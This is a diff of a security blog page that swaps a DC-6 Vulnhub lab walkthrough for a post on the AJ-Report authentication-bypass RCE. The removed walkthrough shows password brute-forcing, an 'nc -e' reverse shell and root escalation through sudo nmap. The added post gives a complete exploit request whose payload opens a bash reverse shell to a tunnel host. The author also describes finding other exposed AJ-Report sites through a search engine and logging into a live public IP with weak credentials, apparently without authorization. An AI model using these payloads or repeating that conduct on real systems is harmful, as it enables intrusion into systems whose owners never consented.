@@ -17,7 +17,7 @@
     <meta name="keywords" content="G00dddd">
 
 
-<title>DC-6 | G00d`s Blog</title>
+<title>Vulhub-4.AJ-Report | G00d`s Blog</title>
 
 
 
@@ -390,7 +390,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">DC-6</h1>
+            <h1 class="post-title">Vulhub-4.AJ-Report</h1>
             
                 <div class="post-meta">
                     
@@ -399,14 +399,14 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:06:26</a>
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:21:06</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                                <a href="../categories/Vulhub/">Vulhub</a>
                             
                         </span>
                     
@@ -415,49 +415,24 @@
         </header>
 
         <div class="post-content">
-            <h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>第一步信息收集</p>
-<p><img src="/dc-6//1.png" alt="1"></p>
-<p>192.168.213.158</p>
-<p><img src="/dc-6//2.png" alt="2"></p>
-<p>Vi &#x2F;etc&#x2F;hosts 把重定向加上就行了</p>
-<p>接着扫目录发现跟之前打过的靶机有点像</p>
-<p><img src="/dc-6//3.png" alt="3"></p>
-<p><img src="/dc-6//4.png" alt="4"></p>
-<p>用wpscan(专门搜索wordpross漏洞)再看看</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a></p>
-<p><img src="/dc-6//5.png" alt="5"></p>
-<p>用wpscan枚举一下用户名</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> –enumerate u</p>
-<p><img src="/dc-6//6.png" alt="6"></p>
-<p>爆出几个账号,cat &gt; 1.txt 保存一下,然后wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> -U 1.txt -P rockyou.txt</p>
-<p><img src="/dc-6//7.png" alt="7"></p>
-<p>Url&#x2F;wp-login.php 登录后台发现activity monitor</p>
-<p>用searchsploit activity monitor</p>
-<p><img src="/dc-6//8.png" alt="8"></p>
-<p><img src="/dc-6//../../../../%E5%88%B7%E9%A2%98/%E6%9C%AC%E5%9C%B0/vulnhub/media/image9.png"><img src="/dc-6//9.png" alt="9">这里有命令执行,127.0.0.1|nc -e &#x2F;bin&#x2F;bash 192.168.213.137 9999</p>
-<p><img src="/dc-6//10.png" alt="10"></p>
-<p>拿到普通权限</p>
-<p>Python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<p>在主机内部找信息</p>
-<p><img src="/dc-6//11.png" alt="11"></p>
-<p>Ssh <a href="mailto:&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;">&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;</a></p>
-<p>提权</p>
-<p><img src="/dc-6//12.png" alt="12"></p>
-<p>我们发现当前账号对backups.sh读写操作</p>
-<p>把shell写入backups</p>
-<p>Echo “&#x2F;bin&#x2F;bash” &gt;&gt; backups.sh</p>
-<p>Sudo -u jens .&#x2F;backups.sh &#x2F;&#x2F;这里用jens执行backups</p>
-<p><img src="/dc-6//13.png" alt="13"></p>
-<p>发现切换账号成功</p>
-<p>Sudo -l发现jens可以用root执行nmap,那就用nmap提权</p>
-<p><img src="/dc-6//14.png" alt="14"></p>
-<p>需要先看nmap的版本号 nmap -v</p>
-<p>然后把shell写入”shell”里,用nmap执行</p>
-<p>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; shell</p>
-<p>sudo nmap –script&#x3D;shell</p>
-<p><img src="/dc-6//15.png" alt="15"></p>
-<p>添加root账号</p>
-<p>useradd -u 0 -o -g 0 -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;root1-m root1</p>
+            <h1 id="AJ-Report"><a href="#AJ-Report" class="headerlink" title="AJ-Report"></a>AJ-Report</h1><h2 id="认证绕过与远程代码执行漏洞（CNVD-2024-15077）"><a href="#认证绕过与远程代码执行漏洞（CNVD-2024-15077）" class="headerlink" title="认证绕过与远程代码执行漏洞（CNVD-2024-15077）"></a>认证绕过与远程代码执行漏洞（CNVD-2024-15077）</h2><p>AJ-Report是全开源的一个BI平台，酷炫大屏展示，能随时随地掌控业务动态，让每个决策都有数据支撑。多数据源支持，内置mysql、elasticsearch、kudu等多种驱动，支持自定义数据集省去数据接口开发，支持17+种大屏组件。在其1.4.0版本及以前，存在一处认证绕过漏洞，攻击者利用该漏洞可以绕过权限校验并执行任意代码。<a target="_blank" rel="noopener" href="http://8.130.129.187:9095/index.html">http://8.130.129.187:9095/index.html</a></p>
+<p><img src="/vulhub-4-aj-report//1.png" alt="1"></p>
+<p>复现这里不需要加端口号,这里查看当前登录用户的权限,可以反弹shell</p>
+<p>POST &#x2F;dataSetParam&#x2F;verification;swagger-ui&#x2F; HTTP&#x2F;1.1</p>
+<p>Host: 8.130.129.187</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36</p>
+<p>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</p>
+<p>Accept-Encoding: gzip, deflate, br</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Content-Type: application&#x2F;json;charset&#x3D;UTF-8</p>
+<p>Connection: close</p>
+<p>Content-Length: 391</p>
+<p>{“ParamName”:””,”paramDesc”:””,”paramType”:””,”sampleItem”:”1”,”mandatory”:true,”requiredFlag”:1,”validationRules”:”function verification(data){a &#x3D; new java.lang.ProcessBuilder(\bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;tcp:&#x2F;&#x2F;25.tcp.cpolar.top&#x2F;10118 0&gt;&amp;1\).start().getInputStream();r&#x3D;new java.io.BufferedReader(new java.io.InputStreamReader(a));ss&#x3D;’’;while((line &#x3D; r.readLine()) !&#x3D; null){ss+&#x3D;line};return ss;}”}</p>
+<p>用黑暗引擎搜索title&#x3D;”AJ-Report”<img src="/vulhub-4-aj-report//2.png" alt="2"></p>
+<p><img src="/vulhub-4-aj-report//3.png" alt="3">我们发现这个站点也有这个漏洞,后台登录账号密码是admin 123456</p>
+<p>gg了</p>
+<p>36.7.114.97:9001 这个站直接弱口令登录上去了</p>
+<p><img src="/vulhub-4-aj-report//4.AJ-Report/4.png" alt="4"></p>
 
         </div>
 
@@ -494,10 +469,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="../dc-7/">DC-7</a>
+                <a class="prev" rel="prev" href="../vulhub-5-apache-druid/">Vulhub-5.apache-druid</a>
             
             
-            <a class="next" rel="next" href="../dc-5/">DC-5</a>
+            <a class="next" rel="next" href="../vulhub-3-airflow/">Vulhub-3.Airflow</a>
             
         </section>
 
